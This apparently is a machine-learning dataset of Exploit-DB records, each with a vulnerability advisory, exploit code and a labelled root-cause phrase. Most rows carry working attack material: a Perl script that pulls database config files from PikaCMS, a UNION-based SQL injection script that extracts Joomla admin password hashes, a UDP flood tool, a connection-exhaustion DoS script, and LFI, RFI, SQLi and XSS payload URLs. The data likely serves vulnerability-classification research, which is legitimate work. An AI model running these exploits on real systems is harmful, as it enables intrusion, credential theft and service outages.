38616,"Python 2.7 - 'array.fromstring' Method Use-After-Free Title: Python 2.7 array.fromstring Use After Free Credit: John Leitch (john@autosectools.com) Url1: http://autosectools.com/Page/Python-array-fromstring-Use-After-Free Url2: http://bugs.python.org/issue24613 Resolution: Fixed  The Python 2.7 array.fromstring() method suffers from a use after free caused by unsafe realloc use. The issue is triggered when an array is concatenated to itself via fromstring() call:  static PyObject * array_fromstring(arrayobject *self, PyObject *args) {     char *str;     Py_ssize_t n;     int itemsize = self->ob_descr->itemsize;     if (!PyArg_ParseTuple(args, ""s#:fromstring"", &str, &n)) <<<< The str buffer is parsed from args. In cases where an array is passed to itself, self->ob_item == str.         return NULL;     if (n % itemsize != 0) {         PyErr_SetString(PyExc_ValueError,                    ""string length not a multiple of item size"");         return NULL;     }     n = n / itemsize;     if (n > 0) {         char *item = self->ob_item; <<<< If str == self->ob_item, item == str.         if ((n > PY_SSIZE_T_MAX - Py_SIZE(self)) ||             ((Py_SIZE(self) + n) > PY_SSIZE_T_MAX / itemsize)) {                 return PyErr_NoMemory();         }         PyMem_RESIZE(item, char, (Py_SIZE(self) + n) * itemsize); <<<< A realloc call occurs here with item passed as the ptr argument. Because realloc sometimes calls free(), this means that item may be freed. If item was equal to str, str is now pointing to freed memory.         if (item == NULL) {             PyErr_NoMemory();             return NULL;         }         self->ob_item = item;         Py_SIZE(self) += n;         self->allocated = Py_SIZE(self);         memcpy(item + (Py_SIZE(self) - n) * itemsize,                str, itemsize*n); <<<< If str is dangling at this point, a use after free occurs here.     }     Py_INCREF(Py_None);     return Py_None; }  In most cases when this occurs, the function behaves as expected; while the dangling str pointer is technically pointing to deallocated memory, given the timing it is highly likely the memory contains the expected data. However, ocassionally, an errant allocation will occur between the realloc and memcpy, leading to unexpected contents in the str buffer.  In applications that expose otherwise innocuous indirect object control of arrays as attack surface, it may be possible for an attacker to trigger the corruption of arrays. This could potentially be exploited to exfiltrate data or achieve privilege escalation, depending on subsequent operations performed using corrupted arrays.  A proof-of-concept follows:  import array import sys import random  testNumber = 0  def dump(value):     global testNumber     i = 0     for x in value:         y = ord(x)         if (y != 0x41):              end = ''.join(value[i:]).index('A' * 0x10)             sys.stdout.write(""%08x a[%08x]: "" % (testNumber, i))             for z in value[i:i+end]: sys.stdout.write(hex(ord(z))[2:])             sys.stdout.write('\r\n')             break                     i += 1  def copyArray():     global testNumber     while True:         a=array.array(""c"",'A'*random.randint(0x0, 0x10000))         a.fromstring(a)         dump(a)         testNumber += 1      print ""Starting...""     copyArray()  The script repeatedly creates randomly sized arrays filled with 0x41, then calls fromstring() and checks the array for corruption. If any is found, the relevant bytes are written to the console as hex. The output should look something like this:  Starting... 00000007 a[00000cdc]: c8684d0b0f54c0 0000001d a[0000f84d]: b03f4f0b8be620 00000027 a[0000119f]: 50724d0b0f54c0 0000004c a[00000e53]: b86b4d0b0f54c0 0000005a a[000001e1]: d8ab4609040620 00000090 a[0000015b]: 9040620104e5f0 0000014d a[000002d6]: 10ec620d8ab460 00000153 a[000000f7]: 9040620104e5f0 0000023c a[00000186]: 50d34c0f8b65a0 00000279 a[000001c3]: d8ab4609040620 000002ee a[00000133]: 9040620104e5f0 000002ff a[00000154]: 9040620104e5f0 0000030f a[00000278]: 10ec620d8ab460 00000368 a[00000181]: 50d34c0f8b65a0 000003b2 a[0000005a]: d0de5f0d05e5f0 000003b5 a[0000021c]: b854d00d3620 00000431 a[000001d8]: d8ab4609040620 0000044b a[000002db]: 10ec620d8ab460 00000461 a[000000de]: 9040620104e5f0 000004fb a[0000232f]: 10f74d0c0ce620 00000510 a[0000014a]: 9040620104e5f0  In some applications, such as those that are web-based, similar circumstances may manifest that would allow for remote exploitation.  To fix the issue, array_fromstring should check if self->ob_item is pointing to the same memory as str, and handle the copy accordingly.",unsafe realloc use,1
34106,"cPanel 11.25 Image Manager - 'target' Local File Inclusion source: https://www.securityfocus.com/bid/40622/info  cPanel Image Manager is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this vulnerability to view files and execute local scripts in the context of the webserver process, which may aid in further attacks.  http://www.example.com/frontend/x3/cpanelpro/doconvert.html?target=/etc/",fails to properly sanitize user-supplied input,1
35815,"PikaCMS - Multiple Local File Disclosure Vulnerabilities source: https://www.securityfocus.com/bid/48068/info  PikaCMS is prone to multiple local file-disclosure vulnerabilities because it fails to adequately validate user-supplied input.  Exploiting these vulnerabilities may allow an attacker to obtain potentially sensitive information from local files on computers running the vulnerable application. This may aid in further attacks.   use LWP::Simple; use LWP::UserAgent; system('cls'); system('title Pika CMS <= Remote 'baza_mysql.php' Disclosure  Exploit'); system('color 2'); if(@ARGV < 2) { print ""[-]Su Sekilde Kocum. \n\n""; &help; exit(); } sub help() { print ""[+] usage1 : perl $0 HedefWeb /path/ \n""; print ""[+] usage2 : perl $0 localhost / \n""; } print ""\n************************************************************************\n""; print ""\* Pika CMS <= Remote 'baza_mysql.php' Disclosure  Exploit              *\n""; print ""\* Exploited By : KnocKout                                                  *\n""; print ""\* Contact :   knockoutr[at]msn[dot]com                                 *\n""; print ""\* --                                    *\n""; print ""\*********************************************************************\n\n\n""; ($TargetIP, $path, $File,) = @ARGV; $File=""shkarko.php?f=lidhjet/baza_mysql.php""; my $url = ""http://"" . $TargetIP . $path . $File; print ""\n Az Bekle Sikertiyorum!!! \n\n""; my $useragent = LWP::UserAgent->new(); my $request = $useragent->get($url,"":content_file"" => ""baza_mysql.php""); if ($request->is_success) { print ""[+] $url <= Hedef Site Exploit Edildi!\n\n""; print ""[+] OPERASYON TAMAM !\n""; print ""[+] baza_mysql.php Dosyasi Indirildi (z_WALKING_TIMES_DATA.php)\n""; print ""[+] GRAYHATZ STAR \n""; print ""[+] Special tnX # + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re (www.1337day.com)  # Inj3ct0r Members 31337 : Indoushka * KnocKout * eXeSoul * eidelweiss * SeeMe * XroGuE * agix * KedAns-Dz # gunslinger_ * Sn!pEr.S!Te * ZoRLu * anT!-Tr0J4n 'www.1337day.com/team' ++ ....   \n""; exit(); } else { print ""[!] Exploit $url Basarisiz !\n[!] "".$request->status_line.""\n""; exit(); }",fails to adequately validate user-supplied input,1
30678,"Nortel Networks UNIStim IP SoftPhone 2050 - RTCP Port Buffer Overflow source: https://www.securityfocus.com/bid/26118/info  Nortel Networks UNIStim IP Softphone is prone to a buffer-overflow vulnerability because the application fails to properly bounds-check user-supplied data before copying it to an insufficiently sized memory buffer.  An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.  Flood.java /**  * June, 2007 - Cyrill Brunschwiler - COMPASS SECURITY AG  *  * No warranty, all rights reserved.  */   package ch.csnc.udpollution;  import java.io.IOException; import java.net.DatagramPacket; import java.net.DatagramSocket; import java.net.InetSocketAddress; import java.util.Random;  public class Flood { 	 	private static DatagramSocket m_socket = null; 	private static InetSocketAddress m_address = null; 	private static long m_start; 	private static int m_default = -1; 	private static Random m_rand = new Random(); 	 	 	/** 	 * @param args 	 */ 	public static void main(String[] args) { 		 		try { 			m_address = new InetSocketAddress(args[0],  Integer.parseInt(args[1])); 			m_socket = new  DatagramSocket(Integer.parseInt(args[2])); 			 			String packetType = args[3];  			long count = Integer.parseInt(args[4]); 			int maxlen = m_default; 			 			try { 				maxlen = Integer.parseInt(args[5]); 			} catch (RuntimeException e) {			 			} 			 			System.out.println(""Target: "" +  m_address.getAddress().getHostAddress() +"":"" + m_address.getPort()); 			System.out.println(""Packet: "" + packetType); 			System.out.print(""\nflooding.""); 			m_start = System.currentTimeMillis(); 			byte[] data; 			 			if (""resume"".equals(packetType)) { 				 				String resume = ""FFFFFFFF"" + ""0202"" +  ""FFFFFFFF""; 				byte [] overlay =  Hexadecimal.parseSeq(resume); 							 				for (int i=1; i<=count; i++) { 					 					if (maxlen == -1) { 						data =   Hexadecimal.parseSeq(resume + ""9e0308""); 					} 					else { 						data = new  byte[m_rand.nextInt(maxlen) + 10]; 						m_rand.nextBytes(data); 						 						 						for (int j=0;  j<overlay.length;j++) { 							data[j] =  overlay[j]; 						}						 					} 					 					sendData(data); 					 					if (count > 20 && i % (count/20)  == 0) 						System.out.print("".""); 				} 			} 			if (""garbage"".equals(packetType)) { 				 				for (int i=1; i<=count; i++) { 					data = new  byte[m_rand.nextInt(maxlen)]; 					m_rand.nextBytes(data); 					sendData(data); 					 					if (count > 20 && i % (count/20)  == 0) 						System.out.print("".""); 				} 			} 			 			long time = (System.currentTimeMillis() -  m_start)/1000; 			long avg = count; 			 			if (time > 0) 				avg = count/time; 			 			System.out.println("" done in "" + time + ""s; avg.  "" +avg+ "" packets/s""); 			 		} catch (Exception e) { 			System.out.println(""\nusage: java  ch.csnc.udpollution.Flood destIP destPort sourcePort packetType  packetAmount [packetLength]""); 			System.out.println(""       java  ch.csnc.udpollution.Flood 1.2.3.4 5678 9012 garbage 4000 30\n""); 			 			e.printStackTrace(); 		} 	} 	 	private static void sendData(byte [] data) throws IOException { 		 		int len = data.length; 		 		DatagramPacket packet = new DatagramPacket(new  byte[len], len); 		packet.setAddress(m_address.getAddress()); 		packet.setPort(m_address.getPort()); 		packet.setData(data); 		packet.setLength(len); 		m_socket.send(packet); 	} }  Hexadecimal.java package ch.csnc.udpollution;  import java.util.StringTokenizer;  /*  * @(#)Hexadecimal.java  *   * IBM Confidential-Restricted  *   * OCO Source Materials  *   * 03L7246 (c) Copyright IBM Corp. 1996, 1998  *   * The source code for this program is not published or otherwise  * divested of its trade secrets, irrespective of what has been  * deposited with the U.S. Copyright Office.  */  /**  * The <tt>Hexadecimal</tt> class  *   * @version     1.00    $Date: 2001/07/28 06:33:13 $  * @author      ONO Kouichi  */  public class Hexadecimal { 	private String _hex = null; 	private int _num = 0;  	/** 	 * Constructs a hexadecimal number with a byte. 	 * @param num a byte 	 */ 	public Hexadecimal(byte num) { 		_hex = valueOf(num); 		_num = (int)num; 	} 	/** 	 * Constructs a hexadecimal number with a integer. 	 * @param num a integer 	 */ 	public Hexadecimal(int num) { 		_hex = valueOf(num); 		_num = (int)num; 	} 	/** 	 * Constructs a hexadecimal number with a short integer. 	 * @param num a short integer 	 */ 	public Hexadecimal(short num) { 		_hex = valueOf(num); 		_num = (int)num; 	} 	/** 	 * Gets a byte value. 	 * @return a byte of the hexadecimal number 	 */ 	public byte byteValue() throws NumberFormatException { 		if (_num > 255 || _num < 0) { 			throw new NumberFormatException(""Out of range  for byte.""); 		}  		return (byte)_num; 	} 	// -   /** 	// -    * Constructs a hexadecimal number with a long integer. 	// -    * @param num a long integer 	// -    */ 	// -   public Hexadecimal(long num) { 	// -     _hex = valueOf(num); 	// -     _num = (int)num; 	// -   }  	/** 	 * Gets a string in hexadecimal notation. 	 * @return string in hexadecimal notation of the number 	 */ 	public String hexadecimalValue() { 		return _hex; 	} 	/** 	 * Gets a integer value. 	 * @return a integer of the hexadecimal number 	 */ 	public int intValue() throws NumberFormatException { 		if (_num > 4294967295L || _num < 0) { 			throw new NumberFormatException(""Out of range  for integer.""); 		}  		return (int)_num; 	} 	public static void main(String[] args) { 		StringBuffer buff = new StringBuffer();  		for (int i = 0; i < args.length; i++) { 			buff.append(args[i]); 		}  		try { 			byte[] seq = parseSeq(buff.toString());  			for (int i = 0; i < seq.length; i++) { 				System.out.print(seq[i] + "" ""); 			}  			System.out.println(""""); 		} catch (NumberFormatException excpt) { 			System.err.println(excpt.toString()); 		}  	} 	// -   /** 	// -    * Converts a string in hexadecimal notation into long  integer. 	// -    * @param hex string in hexadecimal notation 	// -    * @return a long integer (8bytes) 	// -    */ 	// -   public static long parseLong(String hex) throws  NumberFormatException { 	// -     if(hex==null) { 	// -       throw new IllegalArgumentException(""Null string in  hexadecimal notation.""); 	// -     } 	// -     if(hex.equals("""")) { 	// -       return 0; 	// -     } 	// - 	// -     return Integer.decode(""0x""+hex).longValue(); 	// -   }  	/** 	 * Converts a pair of characters as an octet in hexadecimal  notation into integer. 	 * @param c0 higher character of given octet in hexadecimal  notation 	 * @param c1 lower character of given octet in hexadecimal  notation 	 * @return a integer value of the octet 	 */ 	public static int octetValue(char c0,  								 char  c1) throws NumberFormatException { 		int n0 = Character.digit(c0, 16);  		if (n0 < 0) { 			throw new NumberFormatException(c0  											 + "" is not a hexadecimal character.""); 		}  		int n1 = Character.digit(c1, 16);  		if (n1 < 0) { 			throw new NumberFormatException(c1  											 + "" is not a hexadecimal character.""); 		}  		return (n0 << 4) + n1; 	} 	/** 	 * Converts a string in hexadecimal notation into byte. 	 * @param hex string in hexadecimal notation 	 * @return a byte (1bytes) 	 */ 	public static byte parseByte(String hex) throws  NumberFormatException { 		if (hex == null) { 			throw new IllegalArgumentException(""Null string  in hexadecimal notation.""); 		}  		if (hex.equals("""")) { 			return 0; 		}  		Integer num = Integer.decode(""0x"" + hex); 		int n = num.intValue();  		if (n > 255 || n < 0) { 			throw new NumberFormatException(""Out of range  for byte.""); 		}  		return num.byteValue(); 	} 	/** 	 * Converts a string in hexadecimal notation into integer. 	 * @param hex string in hexadecimal notation 	 * @return a integer (4bytes) 	 */ 	public static int parseInt(String hex) throws  NumberFormatException { 		if (hex == null) { 			throw new IllegalArgumentException(""Null string  in hexadecimal notation.""); 		}  		if (hex.equals("""")) { 			return 0; 		}  		Integer num = Integer.decode(""0x"" + hex); 		long n = num.longValue();  		if (n > 4294967295L || n < 0L) { 			throw new NumberFormatException(""Out of range  for integer.""); 		}  		return num.intValue(); 	} 	/** 	 * Converts a string in hexadecimal notation into byte sequence. 	 * @param str a string in hexadecimal notation 	 * @return byte sequence 	 */ 	public static byte[] parseSeq(String str) throws  NumberFormatException { 		if (str == null || str.equals("""")) { 			return null; 		}  		int len = str.length();  		if (len % 2 != 0) { 			throw new NumberFormatException(""Illegal length  of string in hexadecimal notation.""); 		}  		int numOfOctets = len / 2; 		byte[] seq = new byte[numOfOctets];  		for (int i = 0; i < numOfOctets; i++) { 			String hex = str.substring(i * 2, i * 2 + 2);  			seq[i] = parseByte(hex); 		}  		return seq; 	} 	/** 	 * Converts a string in hexadecimal notation into byte sequence. 	 * @param str a string in hexadecimal notation 	 * @param delimiters a set of delimiters 	 * @return byte sequence 	 */ 	public static byte[] parseSeq(String str, String delimiters)  			throws NumberFormatException { 		if (str == null || str.equals("""")) { 			return null; 		}  		if (delimiters == null || delimiters.equals("""")) { 			return parseSeq(str); 		}  		StringTokenizer tokenizer = new StringTokenizer(str,  delimiters); 		int numOfOctets = tokenizer.countTokens(); 		byte[] seq = new byte[numOfOctets]; 		int i = 0;  		while (tokenizer.hasMoreTokens() && i < numOfOctets) { 			seq[i] =  Hexadecimal.parseByte(tokenizer.nextToken()); 			i++; 		}  		return seq; 	} 	/** 	 * Converts a string in hexadecimal notation into short integer. 	 * @param hex string in hexadecimal notation 	 * @return a short integer (2bytes) 	 */ 	public static short parseShort(String hex) throws  NumberFormatException { 		if (hex == null) { 			throw new IllegalArgumentException(""Null string  in hexadecimal notation.""); 		}  		if (hex.equals("""")) { 			return 0; 		}  		Integer num = Integer.decode(""0x"" + hex); 		int n = num.intValue();  		if (n > 65535 || n < 0) { 			throw new NumberFormatException(""Out of range  for short integer.""); 		}  		return num.shortValue(); 	} 	/** 	 * Gets a short integer value. 	 * @return a short integer of the hexadecimal number 	 */ 	public short shortValue() throws NumberFormatException { 		if (_num > 65535 || _num < 0) { 			throw new NumberFormatException(""Out of range  for short integer.""); 		}  		return (short)_num; 	} 	/** 	 * Converts a byte sequence into its hexadecimal notation. 	 * @param seq a byte sequence 	 * @return hexadecimal notation of the byte sequence 	 */ 	public static String valueOf(byte[] seq) { 		if (seq == null) { 			return null; 		}  		StringBuffer buff = new StringBuffer();  		for (int i = 0; i < seq.length; i++) { 			buff.append(valueOf(seq[i], true)); 		}  		return buff.toString(); 	} 	/** 	 * Converts a byte sequence into its hexadecimal notation. 	 * @param seq a byte sequence 	 * @param separator separator between bytes 	 * @return hexadecimal notation of the byte sequence 	 */ 	public static String valueOf(byte[] seq, char separator) { 		if (seq == null) { 			return null; 		}  		StringBuffer buff = new StringBuffer();  		for (int i = 0; i < seq.length; i++) { 			if (i > 0) { 				buff.append(separator); 			}  			buff.append(valueOf(seq[i], true)); 		}  		return buff.toString(); 	} 	/** 	 * Converts a byte into its hexadecimal notation. 	 * @param num a byte (1bytes) 	 * @return hexadecimal notation of the byte 	 */ 	public static String valueOf(byte num) { 		return valueOf(num, true); 	} 	/** 	 * Converts a byte into its hexadecimal notation. 	 * @param num a byte (1bytes) 	 * @param padding fit the length to 2 by filling with '0' when  padding is true 	 * @return hexadecimal notation of the byte 	 */ 	public static String valueOf(byte num, boolean padding) { 		String hex = Integer.toHexString((int)num);  		if (padding) { 			hex = ""00"" + hex; 			int len = hex.length();  			hex = hex.substring(len - 2, len); 		}  		return hex; 	} 	/** 	 * Converts a integer into its hexadecimal notation. 	 * @param num a integer (4bytes) 	 * @return hexadecimal notation of the integer 	 */ 	public static String valueOf(int num) { 		return valueOf(num, true); 	} 	/** 	 * Converts a integer into its hexadecimal notation. 	 * @param num a integer (4bytes) 	 * @param padding fit the length to 8 by filling with '0' when  padding is true 	 * @return hexadecimal notation of the integer 	 */ 	public static String valueOf(int num, boolean padding) { 		String hex = Integer.toHexString(num);  		if (padding) { 			hex = ""00000000"" + hex; 			int len = hex.length();  			hex = hex.substring(len - 8, len); 		}  		return hex; 	} 	/** 	 * Converts a long integer into its hexadecimal notation. 	 * @param num a long integer (8bytes) 	 * @return hexadecimal notation of the long integer 	 */ 	public static String valueOf(long num) { 		return valueOf(num, true); 	} 	/** 	 * Converts a long integer into its hexadecimal notation. 	 * @param num a long integer (8bytes) 	 * @param padding fit the length to 16 by filling with '0' when  padding is true 	 * @return hexadecimal notation of the long integer 	 */ 	public static String valueOf(long num, boolean padding) { 		String hex = Long.toHexString(num);  		if (padding) { 			hex = ""0000000000000000"" + hex; 			int len = hex.length();  			hex = hex.substring(len - 16, len); 		}  		return hex; 	} 	/** 	 * Converts a short integer into its hexadecimal notation. 	 * @param num a short integer (2bytes) 	 * @return hexadecimal notation of the short integer 	 */ 	public static String valueOf(short num) { 		return valueOf(num, true); 	} 	/** 	 * Converts a short integer into its hexadecimal notation. 	 * @param num a short integer (2bytes) 	 * @param padding fit the length to 8 by filling with '0' when  padding is true 	 * @return hexadecimal notation of the short integer 	 */ 	public static String valueOf(short num, boolean padding) { 		String hex = Integer.toHexString((int)num);  		if (padding) { 			hex = ""0000"" + hex; 			int len = hex.length();  			hex = hex.substring(len - 4, len); 		}  		return hex; 	} }",the application fails to properly bounds-check user-supplied data before copying it to an insufficiently sized memory buffer,1
29909,"HYIP Manager Pro - Multiple Remote File Inclusions source: https://www.securityfocus.com/bid/23663/info  HYIP Manager Pro is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.  Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.   http://www.example.com/inc/libs/Smarty_Compiler.class.php?plugin_file=http://www,example2.com",fails to sufficiently sanitize user-supplied data,1
42744,"Microsoft Windows Kernel - 'win32k.sys' '.TTF' Font Processing Out-of-Bounds Reads/Writes with Malformed 'fpgm' table 'win32k!bGeneratePath' (Denial of Service) Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1273  We have encountered a number of Windows kernel crashes in the win32k.sys driver while processing corrupted TTF font files. The most frequent one occurring for the bug reported here is as follows:  ---   PAGE_FAULT_IN_NONPAGED_AREA (50)   Invalid system memory was referenced.  This cannot be protected by try-except,   it must be protected by a Probe.  Typically the address is just plain bad or it   is pointing at freed memory.   Arguments:   Arg1: 8273777f, memory referenced.   Arg2: 00000000, value 0 = read operation, 1 = write operation.   Arg3: 919c279f, If non-zero, the instruction address which referenced the bad memory     address.   Arg4: 00000000, (reserved)    Debugging Details:   ------------------    FAULTING_IP:    win32k!bGeneratePath+60   919c279f 8b0f            mov     ecx,dword ptr [edi]    MM_INTERNAL_CODE:  0    DEFAULT_BUCKET_ID:  WIN7_DRIVER_FAULT    BUGCHECK_STR:  0x50    PROCESS_NAME:  csrss.exe    CURRENT_IRQL:  0    ANALYSIS_VERSION: 6.3.9600.17237 (debuggers(dbg).140716-0327) x86fre    LAST_CONTROL_TRANSFER:  from 91a9b6af to 919c279f    STACK_TEXT:     99ee4a14 91a9b6af 00000000 000003e0 00000010 win32k!bGeneratePath+0x60   99ee4a40 91a9a105 fbc62cf0 00000005 faebeda0 win32k!ttfdQueryTrueTypeOutline+0x79   99ee4a90 91a82fef 00000000 fbc62cf0 00000005 win32k!ttfdSemQueryTrueTypeOutline+0x45   99ee4ad8 91a65175 00000000 fbc62cf0 00000005 win32k!PDEVOBJ::QueryTrueTypeOutline+0x3e   99ee4b90 91a5cd60 fbc62cf0 fbc62cf0 00000003 win32k!GreGetGlyphOutlineInternal+0x4f5   99ee4c0c 8286c87a 2801007e 0000003b 00000003 win32k!NtGdiGetGlyphOutline+0x95   99ee4c0c 770570b4 2801007e 0000003b 00000003 nt!KiFastCallEntry+0x12a   WARNING: Frame IP not in any known module. Following frames may be wrong.   002df760 00000000 00000000 00000000 00000000 0x770570b4 ---  We have observed the invalid memory addresses accessed by the win32k!bGeneratePath function to be seemingly ""wild"", e.g. 0x8273777f, 0xe9849de5, 0xc7617bc7, 0xf2edc7eb etc. The above crash dump comes from an old version of Windows 7 32-bit, because symbols for win32k.sys on the latest build are currently unavailable on the Microsoft Symbol Server. Nevertheless, a crash summary from an up-to-date system is as follows:  --- cut ---   PAGE_FAULT_IN_NONPAGED_AREA (50)   Invalid system memory was referenced.  This cannot be protected by try-except,   it must be protected by a Probe.  Typically the address is just plain bad or it   is pointing at freed memory.   Arguments:   Arg1: 8128f57d, memory referenced.   Arg2: 00000000, value 0 = read operation, 1 = write operation.   Arg3: 925375f6, If non-zero, the instruction address which referenced the bad memory     address.   Arg4: 00000000, (reserved)    Debugging Details:   ------------------    FAULTING_IP:    win32k!PATHOBJ_bCloseFigure+76   925375f6 8b0f            mov     ecx,dword ptr [edi]    MM_INTERNAL_CODE:  0    DEFAULT_BUCKET_ID:  WIN7_DRIVER_FAULT    BUGCHECK_STR:  0x50    PROCESS_NAME:  csrss.exe    CURRENT_IRQL:  0    ANALYSIS_VERSION: 6.3.9600.17237 (debuggers(dbg).140716-0327) x86fre    LAST_CONTROL_TRANSFER:  from 9261b9c8 to 925375f6    STACK_TEXT:     WARNING: Stack unwind information not available. Following frames may be wrong.   89277a10 9261b9c8 00000000 00000150 00000010 win32k!PATHOBJ_bCloseFigure+0x76   89277a3c 9261a316 fbb26cf0 0000000c fba36f38 win32k!XLATEOBJ_hGetColorTransform+0x423bf   89277a8c 926019b4 00000000 fbb26cf0 0000000c win32k!XLATEOBJ_hGetColorTransform+0x40d0d   89277ad4 925e33e5 00000000 fbb26cf0 0000000c win32k!XLATEOBJ_hGetColorTransform+0x283ab   89277b90 925dafcc fbb26cf0 fbb26cf0 00000003 win32k!XLATEOBJ_hGetColorTransform+0x9ddc   89277c0c 82837986 2201061c 00000029 00000003 win32k!XLATEOBJ_hGetColorTransform+0x19c3   89277c0c 772b6c74 2201061c 00000029 00000003 nt!KiSystemServicePostCall   0019f608 00000000 00000000 00000000 00000000 0x772b6c74 --- cut ---  While the above crashes are the most common ones, we have also encountered bugchecks (likely caused by the same issue) at the following other locations on old Windows 7 32-bit:  ---   win32k!vQsplineToPolyBezier+43   91522614 8b4608          mov     eax,dword ptr [esi+8] ---   win32k!vQsplineToPolyBezier+83   92292654 8941fc          mov     dword ptr [ecx-4],eax ---  ... and on latest Windows 7 32-bit:  ---   win32k!EngDeleteRgn+3293   91e0747c 8b460c          mov     eax,dword ptr [esi+0Ch] ---  The crash in win32k!vQsplineToPolyBezier+83 strongly suggests that the failures are caused or may lead to memory corruption, and consequently to arbitrary code execution.  While we have not determined the specific root cause of the vulnerability, we have pinpointed the offending mutations to reside in the ""fpgm"" table. In case of the few samples we have examined, the problem seems to stem from changing one of the instructions in the FPGM program to ""FLIPPT"".  The issue reproduces on Windows 7 (other platforms unchecked). It is easiest to reproduce with Special Pools enabled for win32k.sys (leading to an immediate crash when the bug is triggered), but it it also possible to observe a system crash on a default Windows installation. In order to reproduce the problem with the provided samples, it is necessary to use a custom program which calls the GetGlyphOutline() API with various parameters over all of the font's glyphs.  Attached is an archive with several proof-of-concept mutated TTF files.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42744.zip",Invalid system memory was referenced,1
22585,"EType EServ 2.98/2.99/3.0 - Resource Exhaustion (Denial of Service) (1) source: https://www.securityfocus.com/bid/7552/info  A denial of service vulnerability has been reported for EServ. The vulnerability exists due to the way the server handles connections. Specifically, memory allocated for open connections are not properly freed when a connection no longer exists. This will result in a consumption of all available memory resources.  **It has been reported that EServ version 3.0 previously thought to be invulnerable to this issue is affected by this vulnerability. This version was tested on Windows 2000.  This vulnerability affects EServ 2.92 to 3.0.   #!/usr/bin/perl #LEGAL NOTICE: Don't test this on networks you don't administer, #and do not test this tool on networks you don't own without #permission of the network owner.  You are responsible for all #damage due to your use of this tool. use IO::Socket; print ""$0: eServ Remote DoS Exploit\r\n""; print ""By Matthew Murphy \<mattmurphy\@kc.rr.com\>\r\n\r\n""; print ""Server hostname\: ""; $host = trim(chomp($line = <STDIN>)); print ""Service port to probe\: ""; $port = trim(chomp($line = <STDIN>)); print ""\r\nBeginning probe -- stop with CTRL+C\r\n""; while (1) {  $f = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>""$host:$port"");  undef $f; }",the way the server handles connections,1
35734,"ZAPms 1.22 - 'nick' SQL Injection source: https://www.securityfocus.com/bid/47782/info  ZAPms is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  ZAPms 1.22 is vulnerable; other versions may also be affected.   The following example request is available:  <form action=""http://www.example.com/[path]/?sid=1"" method=""post"" id=""Login"" > <input name=""nick"" type=""text"" id=""nick"" value=""'SQL+CODE+HERE"" /> <input name=""pwd"" id=""pwd"" type=""password"" value=""adminpwd"" /> <input name=""submit"" type=""submit"" class=""submit_login"" value=""Login"" /> </form>",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
36588,"Acidcat ASP CMS 3.5 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/51608/info  Acidcat ASP CMS is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  Acidcat ASP CMS 3.5.1 and 3.5.2 are vulnerable; other versions may also be affected.   http://www.example.com/admin/admin_colors.asp?""><script>alert('XSS')</script>  http://www.example.com/admin/admin_config.asp?""><script>alert('XSS')</script>  http://www.example.com/admin/admin_cat_add.asp?""><script>alert('XSS')</script>",fails to properly sanitize user-supplied input before using it in dynamically generated content,1
33673,"Joomla! Component HD FLV Player - 'id' SQL Injection source: https://www.securityfocus.com/bid/38401/info  The HD FLV Player component for Joomla! is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   #!/usr/bin/perl -w   ############################################################################################### # # [~] Joomla Component com_hdflvplayer SQL injection exploit - (id) # [~] Author    : kaMtiEz (kamzcrew@yahoo.com) # [~] Homepage  : http://www.indonesiancoder.com # [~] Date  : 15 February, 2010 # ############################################################################################### # # [ Software Information ] # # [+] Vendor : http://www.hdflvplayer.net/ # [+] Price : $ 99.00 # [+] Vulnerability : SQL injection # [+] Dork : inurl:""CIHUY"" # [+] Type : commercial # ############################################################################################### # # USAGE : perl kaMz.pl # ###############################################################################################   print ""\t\t[!]=========================================================[!]\n\n""; print ""\t\t               [~]  INDONESIANCODER TEAM  [~]                  \n\n""; print ""\t\t[!]=========================================================[!]\n\n""; print ""\t\t  [!]Joomla component com_hdflvplayer SQL injection exploit[!] \n\n""; print ""\t\t                      [~] by kaMtiEz [~]                       \n\n""; print ""\t\t[!]=========================================================[!]\n\n"";    use LWP::UserAgent;    print ""\nsite/path[!]http://www.indonesiancoder.com/kaMz/[!]:""; chomp(my $IBL13Z=<STDIN>);    $kaMtiEz=""concat(username,0x3a,password)""; $tukulesto=""jos_users""; $pathloader=""com_hdflvplayer"";   $r3m1ck = LWP::UserAgent->new() or die ""Could not initialize browser\n""; $r3m1ck->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');    $arianom = $IBL13Z . ""/index.php?option="".$pathloader.""&id=1+AND+1=2+UNION+SELECT+"".$kaMtiEz."",1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18+from+"".$tukulesto.""--""; $gonzhack = $r3m1ck->request(HTTP::Request->new(GET=>$arianom)); $contrex = $gonzhack->content; if ($contrex =~/([0-9a-fA-F]{32})/){ print ""\n[+] CIHUY Admin Password Nya GAN [+]: $1\n\n""; } else{print ""\n[+] Exploit GAGAL GAN ![+]\n""; }   ############################################################################################## # # GREETZZZZZ : # # INDONESIAN CODER TEAM KILL-9 CREW KIRIK CREW MainHack ServerIsDown SurabayaHackerLink IndonesianHacker SoldierOfAllah # tukulesto,M3NW5,arianom,tiw0L,abah_benu,d0ntcry,newbie_043,bobyhikaru,gonzhack # Contrex,onthel,yasea,bugs,Ronz,Pathloader,cimpli,MarahMerah,ibl13z,r3m1ck # Coracore,Gh4mb4s,Jack-,VycOd,m0rgue a.k.a mbamboenk # ##############################################################################################",fails to sufficiently sanitize user-supplied data 